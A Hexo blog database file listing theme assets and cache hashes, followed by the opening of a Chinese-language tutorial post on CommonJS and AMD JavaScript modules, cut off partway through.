{"meta":{"version":1,"warehouse":"4.0.1"},"models":{"Asset":[{"_id":"themes/minos/source/images/check.svg","path":"images/check.svg","modified":0,"renderable":1},{"_id":"themes/minos/source/images/exclamation.svg","path":"images/exclamation.svg","modified":0,"renderable":1},{"_id":"themes/minos/source/images/info.svg","path":"images/info.svg","modified":0,"renderable":1},{"_id":"themes/minos/source/images/logo.png","path":"images/logo.png","modified":0,"renderable":1},{"_id":"themes/minos/source/images/question.svg","path":"images/question.svg","modified":0,"renderable":1},{"_id":"themes/minos/source/images/quote-left.svg","path":"images/quote-left.svg","modified":0,"renderable":1},{"_id":"themes/minos/source/js/insight.js","path":"js/insight.js","modified":0,"renderable":1},{"_id":"themes/minos/source/js/script.js","path":"js/script.js","modified":0,"renderable":1},{"_id":"themes/minos/source/css/insight.less","path":"css/insight.less","modified":0,"renderable":1},{"_id":"themes/minos/source/css/style.less","path":"css/style.less","modified":0,"renderable":1},{"_id":"source/gallery/react+ts.png","path":"gallery/react+ts.png","modified":0,"renderable":0},{"_id":"themes/minos/source/favicon.ico","path":"favicon.ico","modified":0,"renderable":1},{"_id":"source/gallery/xss-1.jpg","path":"gallery/xss-1.jpg","modified":0,"renderable":0},{"_id":"source/gallery/xss-reflective.png","path":"gallery/xss-reflective.png","modified":0,"renderable":0},{"_id":"source/gallery/xss-2.jpg","path":"gallery/xss-2.jpg","modified":0,"renderable":0},{"_id":"source/gallery/xss-3.jpg","path":"gallery/xss-3.jpg","modified":0,"renderable":0},{"_id":"source/gallery/xss-4.jpg","path":"gallery/xss-4.jpg","modified":0,"renderable":0},{"_id":"source/gallery/xss-storage.png","path":"gallery/xss-storage.png","modified":0,"renderable":0}],"Cache":[{"_id":"source/_posts/hello-world.md","hash":"7d98d6592de80fdcd2949bd7401cec12afd98cdf","modified":1646462755332},{"_id":"themes/landscape/.npmignore","hash":"58d26d4b5f2f94c2d02a4e4a448088e4a2527c77","modified":1646462754828},{"_id":"themes/landscape/Gruntfile.js","hash":"71adaeaac1f3cc56e36c49d549b8d8a72235c9b9","modified":1646462755206},{"_id":"themes/landscape/LICENSE","hash":"c480fce396b23997ee23cc535518ffaaf7f458f8","modified":1646462754863},{"_id":"themes/landscape/README.md","hash":"37fae88639ef60d63bd0de22314d7cc4c5d94b07","modified":1646462755335},{"_id":"themes/landscape/_config.yml","hash":"79ac6b9ed6a4de5a21ea53fc3f5a3de92e2475ff","modified":1646462755535},{"_id":"themes/landscape/package.json","hash":"544f21a0b2c7034998b36ae94dba6e3e0f39f228","modified":1646462755314},{"_id":"themes/landscape/languages/de.yml","hash":"3ebf0775abbee928c8d7bda943c191d166ded0d3","modified":1646462755537},{"_id":"themes/landscape/languages/default.yml","hash":"3083f319b352d21d80fc5e20113ddf27889c9d11","modified":1646462755550},{"_id":"themes/landscape/languages/es.yml","hash":"76edb1171b86532ef12cfd15f5f2c1ac3949f061","modified":1646462755573},{"_id":"themes/landscape/languages/fr.yml","hash":"415e1c580ced8e4ce20b3b0aeedc3610341c76fb","modified":1646462755580},{"_id":"themes/landscape/languages/ja.yml","hash":"a73e1b9c80fd6e930e2628b393bfe3fb716a21a9","modified":1646462755591},{"_id":"themes/landscape/languages/ko.yml","hash":"881d6a0a101706e0452af81c580218e0bfddd9cf","modified":1646462755593},{"_id":"themes/landscape/languages/nl.yml","hash":"12ed59faba1fc4e8cdd1d42ab55ef518dde8039c","modified":1646462755594},{"_id":"themes/landscape/languages/no.yml","hash":"965a171e70347215ec726952e63f5b47930931ef","modified":1646462755606},{"_id":"themes/landscape/languages/ru.yml","hash":"4fda301bbd8b39f2c714e2c934eccc4b27c0a2b0","modified":1646462755621},{"_id":"themes/landscape/languages/zh-CN.yml","hash":"ca40697097ab0b3672a80b455d3f4081292d1eed","modified":1646462755622},{"_id":"themes/landscape/languages/pt.yml","hash":"57d07b75d434fbfc33b0ddb543021cb5f53318a8","modified":1646462755608},{"_id":"themes/landscape/languages/zh-TW.yml","hash":"53ce3000c5f767759c7d2c4efcaa9049788599c3","modified":1646462755637},{"_id":"themes/landscape/layout/archive.ejs","hash":"2703b07cc8ac64ae46d1d263f4653013c7e1666b","modified":1646462754892},{"_id":"themes/landscape/layout/category.ejs","hash":"765426a9c8236828dc34759e604cc2c52292835a","modified":1646462754908},{"_id":"themes/landscape/layout/index.ejs","hash":"aa1b4456907bdb43e629be3931547e2d29ac58c8","modified":1646462754927},{"_id":"themes/landscape/layout/layout.ejs","hash":"f155824ca6130080bb057fa3e868a743c69c4cf5","modified":1646462754938},{"_id":"themes/landscape/layout/page.ejs","hash":"7d80e4e36b14d30a7cd2ac1f61376d9ebf264e8b","modified":1646462754953},{"_id":"themes/landscape/layout/post.ejs","hash":"7d80e4e36b14d30a7cd2ac1f61376d9ebf264e8b","modified":1646462754955},{"_id":"themes/landscape/layout/tag.ejs","hash":"eaa7b4ccb2ca7befb90142e4e68995fb1ea68b2e","modified":1646462754964},{"_id":"themes/landscape/scripts/fancybox.js","hash":"aa411cd072399df1ddc8e2181a3204678a5177d9","modified":1646462755156},{"_id":"themes/landscape/layout/_partial/after-footer.ejs","hash":"d0d753d39038284d52b10e5075979cc97db9cd20","modified":1646462754887},{"_id":"themes/landscape/layout/_partial/archive-post.ejs","hash":"c7a71425a946d05414c069ec91811b5c09a92c47","modified":1646462754888},{"_id":"themes/landscape/layout/_partial/archive.ejs","hash":"950ddd91db8718153b329b96dc14439ab8463ba5","modified":1646462754889},{"_id":"themes/landscape/layout/_partial/footer.ejs","hash":"93518893cf91287e797ebac543c560e2a63b8d0e","modified":1646462754910},{"_id":"themes/landscape/layout/_partial/article.ejs","hash":"c4c835615d96a950d51fa2c3b5d64d0596534fed","modified":1646462754894},{"_id":"themes/landscape/layout/_partial/gauges-analytics.ejs","hash":"aad6312ac197d6c5aaf2104ac863d7eba46b772a","modified":1646462754912},{"_id":"themes/landscape/layout/_partial/google-analytics.ejs","hash":"f921e7f9223d7c95165e0f835f353b2938e40c45","modified":1646462754913},{"_id":"themes/landscape/layout/_partial/head.ejs","hash":"5abf77aec957d9445fc71a8310252f0013c84578","modified":1646462754924},{"_id":"themes/landscape/layout/_partial/header.ejs","hash":"7e749050be126eadbc42decfbea75124ae430413","modified":1646462754926},{"_id":"themes/landscape/layout/_partial/mobile-nav.ejs","hash":"e952a532dfc583930a666b9d4479c32d4a84b44e","modified":1646462754939},{"_id":"themes/landscape/layout/_partial/sidebar.ejs","hash":"930da35cc2d447a92e5ee8f835735e6fd2232469","modified":1646462754957},{"_id":"themes/landscape/layout/_widget/archive.ejs","hash":"beb4a86fcc82a9bdda9289b59db5a1988918bec3","modified":1646462754891},{"_id":"themes/landscape/layout/_widget/category.ejs","hash":"dd1e5af3c6af3f5d6c85dfd5ca1766faed6a0b05","modified":1646462754907},{"_id":"themes/landscape/layout/_widget/recent_posts.ejs","hash":"0d4f064733f8b9e45c0ce131fe4a689d570c883a","modified":1646462754957},{"_id":"themes/landscape/layout/_widget/tag.ejs","hash":"2de380865df9ab5f577f7d3bcadf44261eb5faae","modified":1646462754963},{"_id":"themes/landscape/layout/_widget/tagcloud.ejs","hash":"b4a2079101643f63993dcdb32925c9b071763b46","modified":1646462754965},{"_id":"themes/landscape/source/css/_variables.styl","hash":"628e307579ea46b5928424313993f17b8d729e92","modified":1646462755368},{"_id":"themes/landscape/source/css/_extend.styl","hash":"222fbe6d222531d61c1ef0f868c90f747b1c2ced","modified":1646462755367},{"_id":"themes/landscape/source/css/style.styl","hash":"a70d9c44dac348d742702f6ba87e5bb3084d65db","modified":1646462755399},{"_id":"themes/landscape/source/fancybox/fancybox_loading.gif","hash":"1a755fb2599f3a313cc6cfdb14df043f8c14a99c","modified":1646462754996},{"_id":"themes/landscape/source/fancybox/blank.gif","hash":"2daeaa8b5f19f0bc209d976c02bd6acb51b00b0a","modified":1646462754993},{"_id":"themes/landscape/source/fancybox/fancybox_loading@2x.gif","hash":"273b123496a42ba45c3416adb027cd99745058b0","modified":1646462754998},{"_id":"themes/landscape/source/fancybox/fancybox_overlay.png","hash":"b3a4ee645ba494f52840ef8412015ba0f465dbe0","modified":1646462755351},{"_id":"themes/landscape/source/fancybox/fancybox_sprite.png","hash":"17df19f97628e77be09c352bf27425faea248251","modified":1646462755363},{"_id":"themes/landscape/source/fancybox/fancybox_sprite@2x.png","hash":"30c58913f327e28f466a00f4c1ac8001b560aed8","modified":1646462755366},{"_id":"themes/landscape/source/fancybox/jquery.fancybox.css","hash":"aaa582fb9eb4b7092dc69fcb2d5b1c20cca58ab6","modified":1646462754884},{"_id":"themes/landscape/source/fancybox/jquery.fancybox.js","hash":"d08b03a42d5c4ba456ef8ba33116fdbb7a9cabed","modified":1646462755275},{"_id":"themes/landscape/source/fancybox/jquery.fancybox.pack.js","hash":"9e0d51ca1dbe66f6c0c7aefd552dc8122e694a6e","modified":1646462755278},{"_id":"themes/landscape/source/js/script.js","hash":"2876e0b19ce557fca38d7c6f49ca55922ab666a1","modified":1646462755290},{"_id":"themes/landscape/layout/_partial/post/category.ejs","hash":"c6bcd0e04271ffca81da25bcff5adf3d46f02fc0","modified":1646462754895},{"_id":"themes/landscape/layout/_partial/post/date.ejs","hash":"6197802873157656e3077c5099a7dda3d3b01c29","modified":1646462754909},{"_id":"themes/landscape/layout/_partial/post/gallery.ejs","hash":"3d9d81a3c693ff2378ef06ddb6810254e509de5b","modified":1646462754910},{"_id":"themes/landscape/layout/_partial/post/nav.ejs","hash":"16a904de7bceccbb36b4267565f2215704db2880","modified":1646462754941},{"_id":"themes/landscape/layout/_partial/post/tag.ejs","hash":"2fcb0bf9c8847a644167a27824c9bb19ac74dd14","modified":1646462754962},{"_id":"themes/landscape/layout/_partial/post/title.ejs","hash":"2f275739b6f1193c123646a5a31f37d48644c667","modified":1646462754965},{"_id":"themes/landscape/source/css/_partial/archive.styl","hash":"db15f5677dc68f1730e82190bab69c24611ca292","modified":1646462755369},{"_id":"themes/landscape/source/css/_partial/article.styl","hash":"10685f8787a79f79c9a26c2f943253450c498e3e","modified":1646462755380},{"_id":"themes/landscape/source/css/_partial/comment.styl","hash":"79d280d8d203abb3bd933ca9b8e38c78ec684987","modified":1646462755380},{"_id":"themes/landscape/source/css/_partial/footer.styl","hash":"e35a060b8512031048919709a8e7b1ec0e40bc1b","modified":1646462755381},{"_id":"themes/landscape/source/css/_partial/highlight.styl","hash":"bf4e7be1968dad495b04e83c95eac14c4d0ad7c0","modified":1646462755394},{"_id":"themes/landscape/source/css/_partial/header.styl","hash":"85ab11e082f4dd86dde72bed653d57ec5381f30c","modified":1646462755383},{"_id":"themes/landscape/source/css/_partial/mobile.styl","hash":"a399cf9e1e1cec3e4269066e2948d7ae5854d745","modified":1646462755396},{"_id":"themes/landscape/source/css/_partial/sidebar-bottom.styl","hash":"8fd4f30d319542babfd31f087ddbac550f000a8a","modified":1646462755397},{"_id":"themes/landscape/source/css/_partial/sidebar.styl","hash":"404ec059dc674a48b9ab89cd83f258dec4dcb24d","modified":1646462755398},{"_id":"themes/landscape/source/css/_partial/sidebar-aside.styl","hash":"890349df5145abf46ce7712010c89237900b3713","modified":1646462755396},{"_id":"themes/landscape/source/css/fonts/FontAwesome.otf","hash":"b5b4f9be85f91f10799e87a083da1d050f842734","modified":1646462755350},{"_id":"themes/landscape/source/css/fonts/fontawesome-webfont.eot","hash":"7619748fe34c64fb157a57f6d4ef3678f63a8f5e","modified":1646462754982},{"_id":"themes/landscape/source/css/fonts/fontawesome-webfont.woff","hash":"04c3bf56d87a0828935bd6b4aee859995f321693","modified":1646462755496},{"_id":"themes/landscape/source/css/_util/grid.styl","hash":"0bf55ee5d09f193e249083602ac5fcdb1e571aed","modified":1646462755382},{"_id":"themes/landscape/source/css/_util/mixin.styl","hash":"44f32767d9fd3c1c08a60d91f181ee53c8f0dbb3","modified":1646462755395},{"_id":"themes/landscape/source/fancybox/helpers/fancybox_buttons.png","hash":"e385b139516c6813dcd64b8fc431c364ceafe5f3","modified":1646462755351},{"_id":"themes/landscape/source/fancybox/helpers/jquery.fancybox-buttons.js","hash":"dc3645529a4bf72983a39fa34c1eb9146e082019","modified":1646462755251},{"_id":"themes/landscape/source/fancybox/helpers/jquery.fancybox-buttons.css","hash":"1a9d8e5c22b371fcc69d4dbbb823d9c39f04c0c8","modified":1646462754880},{"_id":"themes/landscape/source/fancybox/helpers/jquery.fancybox-thumbs.css","hash":"4ac329c16a5277592fc12a37cca3d72ca4ec292f","modified":1646462754881},{"_id":"themes/landscape/source/fancybox/helpers/jquery.fancybox-media.js","hash":"294420f9ff20f4e3584d212b0c262a00a96ecdb3","modified":1646462755254},{"_id":"themes/landscape/source/fancybox/helpers/jquery.fancybox-thumbs.js","hash":"47da1ae5401c24b5c17cc18e2730780f5c1a7a0c","modified":1646462755271},{"_id":"themes/landscape/source/css/fonts/fontawesome-webfont.ttf","hash":"7f09c97f333917034ad08fa7295e916c9f72fd3f","modified":1646462755477},{"_id":"themes/landscape/source/css/fonts/fontawesome-webfont.svg","hash":"46fcc0194d75a0ddac0a038aee41b23456784814","modified":1646462755439},{"_id":"themes/landscape/source/css/images/banner.jpg","hash":"f44aa591089fcb3ec79770a1e102fd3289a7c6a6","modified":1646462755110},{"_id":"themes/minos/.gitignore","hash":"9193e35d8b7fc33d768461505160c12c96c608bd","modified":1646476428055},{"_id":"themes/minos/README.md","hash":"ba6b4e134d718704cfd030e106bf24d6ef8b496d","modified":1646473219059},{"_id":"themes/minos/LICENSE","hash":"ca01a2d52b59346e82f079c593df6cb26dd9a7a5","modified":1646473219059},{"_id":"themes/minos/_config.yml.example","hash":"c16bbed955c4209e6bfdff834fa6281eb5be417d","modified":1646473219060},{"_id":"themes/minos/package-lock.json","hash":"e1fbecec56fb65379bf651f21fb485376e692b38","modified":1646473219078},{"_id":"themes/minos/package.json","hash":"f9d450db80149dea6c372990cdf51dfde901e5cc","modified":1646473219079},{"_id":"themes/minos/languages/de.yml","hash":"3d6abea8c2990b04fcd54ffd88ab15356b5171e8","modified":1646473219060},{"_id":"themes/minos/languages/en.yml","hash":"24b8cf6b8fc989be612333aa5121808bb8cf029b","modified":1646473219061},{"_id":"themes/minos/languages/es.yml","hash":"5c35950221411e34e7a9821d0b0671da9a458d8c","modified":1646473219061},{"_id":"themes/minos/languages/fr.yml","hash":"cca90260b00842bf73fadb3154c2969102cf80c0","modified":1646473219061},{"_id":"themes/minos/languages/ko.yml","hash":"1acf3f959f1d2b4f7a77e7e82851821aa8635362","modified":1646473219062},{"_id":"themes/minos/languages/pl.yml","hash":"cfd7c898b2841bf7a1490ebfaa3cbb40fd7da50d","modified":1646473219062},{"_id":"themes/minos/languages/ru.yml","hash":"dbb9bee79348e29098af6c56b14bbca6986e9795","modified":1646473219063},{"_id":"themes/minos/languages/zh-cn.yml","hash":"9c5a489b11a056d1ea7b9d4a0e127aef9e192ee4","modified":1646473219063},{"_id":"themes/minos/languages/zh-tw.yml","hash":"f61b67b9c454d16bc3973f6cb142b98a4e19f9b0","modified":1646473219063},{"_id":"themes/minos/layout/archive.ejs","hash":"e3eefe819d61b4d0ee069bb705a9f5707a8bf3da","modified":1646473219064},{"_id":"themes/minos/layout/categories.ejs","hash":"fff6f911d0f548ee749292bc1942f8fbbb1fbfe7","modified":1646473219064},{"_id":"themes/minos/layout/category.ejs","hash":"403c646878834964883ac41e63952f7b1595c0ba","modified":1646473219065},{"_id":"themes/minos/layout/index.ejs","hash":"dff9e199d394f82c5416b814f9e644edbe4090f0","modified":1646473219072},{"_id":"themes/minos/layout/layout.ejs","hash":"45588aa46857cf9403fa79d738ab37a46ddcf773","modified":1646473219072},{"_id":"themes/minos/layout/post.ejs","hash":"68b84a717efc5ca59ee9eb6202ccf05c5a8abda5","modified":1646473219074},{"_id":"themes/minos/layout/tag.ejs","hash":"5593c7cf9618ef5650c779ed9d75424f057aa210","modified":1646473219076},{"_id":"themes/minos/layout/tags.ejs","hash":"e4a9909119294f131a45f10b2cb1058af5fb9be1","modified":1646473219077},{"_id":"themes/minos/lib/rfc5646.js","hash":"8ecf38d0ec7145720ea8e888da314131712770e8","modified":1646473219078},{"_id":"themes/minos/lib/i18n.js","hash":"4c90aa27420e0e2ff74f80e976fe146e96354f61","modified":1646473219078},{"_id":"themes/minos/scripts/10_i18n.js","hash":"9c1f9e3ec3c6299fc599769783925d1898a632f0","modified":1646473219080},{"_id":"themes/minos/scripts/01_check.js","hash":"471ec21a7754065c190c71906804e3dd3ccbf229","modified":1646476234354},{"_id":"themes/minos/scripts/99_config.js","hash":"9bde31f8dcb9e7044b962713e00e52defdc85268","modified":1646473219080},{"_id":"themes/minos/scripts/99_content.js","hash":"ff61d3d631b06024509d4fe28b4e31590a02f05b","modified":1646473219080},{"_id":"themes/minos/scripts/99_tags.js","hash":"f97c2332a7e13fed99672b27c4380a6183d8600e","modified":1646473219081},{"_id":"themes/minos/layout/comment/changyan.ejs","hash":"9ccc7ec354b968e60bdcfcd1dba451d38de61f12","modified":1646473219065},{"_id":"themes/minos/layout/comment/disqus.ejs","hash":"a2becdc02214a673c804af93488489807fa2c99c","modified":1646473219066},{"_id":"themes/minos/layout/comment/facebook.ejs","hash":"e73b6f93d98b27ba9068c1685874ecccfbac737b","modified":1646473219066},{"_id":"themes/minos/layout/comment/gitment.ejs","hash":"20e4efe726ad885f465dfd885e7dc996ba2dbdbc","modified":1646558583591},{"_id":"themes/minos/layout/comment/isso.ejs","hash":"cc6a43bd24be764086f88ad7c5c97ff04df87e0b","modified":1646473219067},{"_id":"themes/minos/layout/comment/livere.ejs","hash":"12ff9a345f6bba2f732f592e39508c2afde89b00","modified":1646473219067},{"_id":"themes/minos/layout/comment/valine.ejs","hash":"b0eef3bea0a54b4b66f860ad69889f87e0408f22","modified":1646473219068},{"_id":"themes/minos/layout/comment/youyan.ejs","hash":"3d6cf9c523a7a5510ec2864bb29f861f9bb78af3","modified":1646473219068},{"_id":"themes/minos/layout/plugins/clipboard.ejs","hash":"a448757bb8a2c29bd9501c625f7df5087bb18dbe","modified":1646473219073},{"_id":"themes/minos/layout/plugins/gallery.ejs","hash":"7c2becafdf6b60e677cdd5756b9d55eba2af4944","modified":1646473219073},{"_id":"themes/minos/layout/plugins/google-analytics.ejs","hash":"2a9d944a60aff7df27def5215bdc071e605c3c42","modified":1646473219073},{"_id":"themes/minos/layout/plugins/katex.ejs","hash":"c8a7ecdc5802007f8fec46a299790ce4e0834acd","modified":1646473219074},{"_id":"themes/minos/layout/plugins/mathjax.ejs","hash":"b92fc2b30040e09145d80ebb9bad6813dda8acf2","modified":1646473219074},{"_id":"themes/minos/layout/common/article.ejs","hash":"3f0ae9f2bf5aae5a6824ee824c552a5af9dc98f0","modified":1646554521125},{"_id":"themes/minos/layout/common/footer.ejs","hash":"cbf141464dbf127294370e843e6a10cd2ac7ea38","modified":1646473219069},{"_id":"themes/minos/layout/common/head.ejs","hash":"4dd9352ea5f5a59d3af2bedac7d545c08bb08531","modified":1646474790018},{"_id":"themes/minos/layout/common/languages.ejs","hash":"89665c656a1ffebc9c97f03e7f9c12dd1d90702a","modified":1646473219070},{"_id":"themes/minos/layout/common/navbar.ejs","hash":"f3aa16f357450651d0454f1ddc06a032f3dc4de3","modified":1646473219070},{"_id":"themes/minos/layout/common/paginator.ejs","hash":"8f5060e4c8a86a3f4e58455c41c98e831e23e4a4","modified":1646473219071},{"_id":"themes/minos/layout/common/scripts.ejs","hash":"7a5a5271930423b95046836597e30e31fa708f66","modified":1646473219071},{"_id":"themes/minos/layout/share/addthis.ejs","hash":"f1c5f337333009d5f00dfbac4864a16ef8f9cb8d","modified":1646473219076},{"_id":"themes/minos/layout/share/sharethis.ejs","hash":"4f2c40f790f3be0a4e79db04f02ea41ba2f4d4c0","modified":1646473219076},{"_id":"themes/minos/layout/search/google-cse.ejs","hash":"a6bf5c30339735126efa7efa684f9eb14dd6136a","modified":1646473219075},{"_id":"themes/minos/layout/search/insight.ejs","hash":"6fb7d27ef40145d8587b46b44a43516135b5a81a","modified":1646473219075},{"_id":"themes/minos/source/css/insight.scss","hash":"f785fc6574d2853c660be39b2e3149d4846b577f","modified":1646473219082},{"_id":"themes/minos/source/css/style.scss","hash":"5c8f648617899ff05c62f27da3bfb91755dff595","modified":1646473219082},{"_id":"themes/minos/source/images/check.svg","hash":"029b8b3523b7daa4005983b4463cd93408308aab","modified":1646473219083},{"_id":"themes/minos/source/images/exclamation.svg","hash":"b2db56f2cc13fce73dbea46c7b446d9bcb3bf0fd","modified":1646473219083},{"_id":"themes/minos/source/images/info.svg","hash":"c8aa387e935ba9a7fa72c5dd000b7d46f2e030c4","modified":1646473219083},{"_id":"themes/minos/source/images/logo.png","hash":"4e012d9ba58cb8f87ee775262ef871c158ac5948","modified":1646473219084},{"_id":"themes/minos/source/images/question.svg","hash":"7153fa2a0c21e32da6a1f96a333d8b66a178569d","modified":1646473219084},{"_id":"themes/minos/source/images/quote-left.svg","hash":"d2561fa8d13e63ff196b71232a5968415ec6e372","modified":1646473219084},{"_id":"themes/minos/source/js/insight.js","hash":"eb23c31141784eef7300f1d1c548950e77883f56","modified":1646473219085},{"_id":"themes/minos/source/js/script.js","hash":"6b670ec4f90fb43b21a0bbd750a217af5d8aab6b","modified":1646473219085},{"_id":"themes/minos/_config.yml","hash":"217efe80bcf6a082cb1475279edc9dac1aa74625","modified":1646729070682},{"_id":"themes/minos/source/css/insight.less","hash":"f785fc6574d2853c660be39b2e3149d4846b577f","modified":1646473219082},{"_id":"themes/minos/source/css/style.less","hash":"2ede844475380bfe875e23c0aa4a392419f139ca","modified":1646476178364},{"_id":"source/_posts/Javascript 模块管理.md","hash":"0b93b1739840b9b6da0734a50d02c54ed97da6e5","modified":1646556144516},{"_id":"source/_posts/lerna项目中集成husky、lint-staged、commitlint和cz-customizable.md","hash":"2f4a1ae120c41ce2741fb513c14f6e53f8048443","modified":1646556106709},{"_id":"source/_posts/在React项目中优雅地使用Typescript.md","hash":"00a42dc5f68062ff9253e09adc450402813b614d","modified":1646556048283},{"_id":"source/_posts/NestJS - 配置.md","hash":"ae35105d8fb3c427d5392f601dd72793aba2c611","modified":1646556122799},{"_id":"source/gallery/react+ts.png","hash":"556243edb01bdbe9c650a0a14413856e0b1945f9","modified":1646047354000},{"_id":"source/_posts/XSS和CSRF的区别及防御.md","hash":"3697ca42f2a94c18c46caebac4005b0f955e68c5","modified":1646792807245},{"_id":"source/gallery/.DS_Store","hash":"94107b97f9c3456f2d605b5bc28c378b05e546c3","modified":1646747389120},{"_id":"source/.DS_Store","hash":"65722812eeaf7deb1b8e3664ac72fd6dd0797cc1","modified":1646814447668},{"_id":"source/gallery/xss-reflective.png","hash":"29c87cf03024b0211fda64ef6354c0efe0c3266b","modified":1640430011000},{"_id":"themes/minos/source/favicon.ico","hash":"c692ba7647351693356f32562f41da4142952701","modified":1646729070698},{"_id":"source/gallery/xss-1.jpg","hash":"cde6a9c66d09eee4db589606c8fd59679a48da58","modified":1646743423798},{"_id":"source/gallery/xss-3.jpg","hash":"1f7ae518ea3e0589b2ce4ac21d130b2dff30136a","modified":1646744156830},{"_id":"source/gallery/xss-4.jpg","hash":"f36aabf9efe4a4aa3137fb81251aed8cb88ab934","modified":1646746335559},{"_id":"source/gallery/xss-storage.png","hash":"e9d95fea631d35ea257940f6698cb563e2c9ae73","modified":1640430011000},{"_id":"source/gallery/xss-2.jpg","hash":"e1b396b6f194977bca9921bb3b37739ce84252b2","modified":1646744152130},{"_id":"public/content.json","hash":"a44d4159575d472d9d0f7aab452689e59be5a0a9","modified":1656564343647},{"_id":"public/index.html","hash":"5c46264ae372c44305628a0861c0eb955651e205","modified":1656564343647},{"_id":"public/archives/index.html","hash":"4b6f87b6e736065b4aacbf7b2d50b3d3a1fceb8c","modified":1656564343647},{"_id":"public/archives/2020/index.html","hash":"8837941382ee81e30a2e7a209b8a8d98079d9299","modified":1656564343647},{"_id":"public/archives/2020/08/index.html","hash":"850b55de062b2c0d8fafdcdf7b2471b3772140a4","modified":1656564343647},{"_id":"public/archives/2021/index.html","hash":"f3713b2694cf8860af915d468c08a3d4865db6cf","modified":1656564343647},{"_id":"public/archives/2021/03/index.html","hash":"b711456ed6d849aa77056886a712bcabdcf3da9c","modified":1656564343647},{"_id":"public/archives/2021/04/index.html","hash":"8521bf72bebf8224d8815e74eff793f80d5ca575","modified":1656564343647},{"_id":"public/archives/2022/index.html","hash":"3c87476692409823dc947f529bc929677ad38f9a","modified":1656564343647},{"_id":"public/archives/2022/03/index.html","hash":"70b4ab6449d5da31ebeb6baa2e8aae0b17a1203e","modified":1656564343647},{"_id":"public/2022/03/08/XSS和CSRF的区别及防御/index.html","hash":"dc712004b9d6db35609d4c53afc0bde8ad83ff60","modified":1656564343647},{"_id":"public/2021/04/19/在React项目中优雅地使用Typescript/index.html","hash":"945758507ef7658f81e7a043649ad05659e00c2e","modified":1656564343647},{"_id":"public/2021/04/02/lerna项目中集成husky、lint-staged、commitlint和cz-customizable/index.html","hash":"93cc6044752de82be2e335a2d815b1ec5c4fb429","modified":1656564343647},{"_id":"public/2021/03/17/NestJS - 配置/index.html","hash":"ebd489f9eff140b2326fe9708ef3bdbdefb865a3","modified":1656564343647},{"_id":"public/2020/08/29/Javascript 模块管理/index.html","hash":"47df9e8a15f4dca0dae384aff565193289d553df","modified":1656564343647},{"_id":"public/categories/index.html","hash":"217c0200f2017b2c1b55c9f54bd839438cc7658a","modified":1656564343647},{"_id":"public/tags/index.html","hash":"ffdc9c10e00e6417e429df908f1d951cdc7f8f7a","modified":1656564343647},{"_id":"public/images/exclamation.svg","hash":"b2db56f2cc13fce73dbea46c7b446d9bcb3bf0fd","modified":1656564343647},{"_id":"public/images/check.svg","hash":"029b8b3523b7daa4005983b4463cd93408308aab","modified":1656564343647},{"_id":"public/images/info.svg","hash":"c8aa387e935ba9a7fa72c5dd000b7d46f2e030c4","modified":1656564343647},{"_id":"public/images/logo.png","hash":"4e012d9ba58cb8f87ee775262ef871c158ac5948","modified":1656564343647},{"_id":"public/images/question.svg","hash":"7153fa2a0c21e32da6a1f96a333d8b66a178569d","modified":1656564343647},{"_id":"public/images/quote-left.svg","hash":"d2561fa8d13e63ff196b71232a5968415ec6e372","modified":1656564343647},{"_id":"public/gallery/react+ts.png","hash":"556243edb01bdbe9c650a0a14413856e0b1945f9","modified":1656564343647},{"_id":"public/favicon.ico","hash":"c692ba7647351693356f32562f41da4142952701","modified":1656564343647},{"_id":"public/gallery/xss-4.jpg","hash":"f36aabf9efe4a4aa3137fb81251aed8cb88ab934","modified":1656564343647},{"_id":"public/gallery/xss-storage.png","hash":"e9d95fea631d35ea257940f6698cb563e2c9ae73","modified":1656564343647},{"_id":"public/gallery/xss-reflective.png","hash":"29c87cf03024b0211fda64ef6354c0efe0c3266b","modified":1656564343647},{"_id":"public/gallery/xss-3.jpg","hash":"1f7ae518ea3e0589b2ce4ac21d130b2dff30136a","modified":1656564343647},{"_id":"public/js/insight.js","hash":"eb23c31141784eef7300f1d1c548950e77883f56","modified":1656564343647},{"_id":"public/js/script.js","hash":"6b670ec4f90fb43b21a0bbd750a217af5d8aab6b","modified":1656564343647},{"_id":"public/css/insight.css","hash":"ac821560c086fbb4fece4f2e28a8be42612ab615","modified":1656564343647},{"_id":"public/gallery/xss-2.jpg","hash":"e1b396b6f194977bca9921bb3b37739ce84252b2","modified":1656564343647},{"_id":"public/gallery/xss-1.jpg","hash":"cde6a9c66d09eee4db589606c8fd59679a48da58","modified":1656564343647},{"_id":"public/css/style.css","hash":"01a2884c36d7ce850410275403e3d775bfe25264","modified":1656564343647}],"Category":[],"Data":[],"Page":[],"Post":[{"title":"Javascript 模块管理","date":"2020-08-29T12:22:43.000Z","_content":"\n## CommonJS\n\n`CommonJS`是`Node.js`对模块开发的标准规范。\n\nCommonJS module基本要求如下：\n<!-- more -->\n- 一个文件就是一个模块，拥有单独的作用域\n- 普通方式定义的 变量、函数、对象都属于该模块内\n- 通过 `require` 来加载模块\n- 通过 `exports` 和 `module.exports` 来暴露模块中的内容\n\n\ndemo1: \n\n```js\n// module.js\nmodule.exports = {\n  name: \"zhang\",\n  getName: function() {\n    console.log(this.name);\n  },\n  changeName: function(n) {\n    this.name = n;\n  }\n};\n\n// index.js\nconst module = require(\"./module/index\");\nconsole.log(module)\t//  {name: \"zhang\", getName: ƒ, changeName: ƒ} \"commons\"\n```\n\ndemo2:\n\n```js\n// module1.js\nconst getParam = () => {\n  console.log(a);\n};\nlet a = 123;\nlet b = 456;\n\nexports.a = a;\nexports.b = b;\nexports.getParam = getParam;\n\n// index.js\nconst module1 = require(\"./module/index1\");\nconsoel.log(module1, \"commons1\")\t// {a: 123, b: 456, getParam: ƒ} \"commons1\"\n``` \n\ndemo3: \n\n```js\n// module2.js\nlet a = 123;\n\nconst getSome = () => {\n  console.log(\"yyy\");\n};\n\nconst getA = () => {\n  console.log(a);\n};\n\nexports.getSome = getSome;\nmodule.exports = getA;\n\n// index.js\nconst module2 = require(\"./module/index2\");\nconsoel.log(module2, \"commons2\")\t// function getA() {...}\n```\n\n> 总结 ： 通过这样的一个对比的例子就可以比较清晰的对比出  exports 和  module.exports  的区别:\n1、当 exports 和 module.exports 同时存在的时候，module.exports 会盖过 exports\n2、当模块内部全部是 exports 的时候， 就等同于 module.exports\n3、最后 我们就可以认定为  exports  其实就是 module.exports 的子集。\n\n## AMD\n\nAMD全称为异步模块定义, 是专门为浏览器中JavaScript环境设计的规范。\n\nAMD设计出一个简洁的写模块API：\n\n``define(id?, dependencies?, factory);``\n\n其中：\n\n- `id`: 模块标识，可以省略。\n- `dependencies`: 所依赖的模块，可以省略。\n- `factory`: 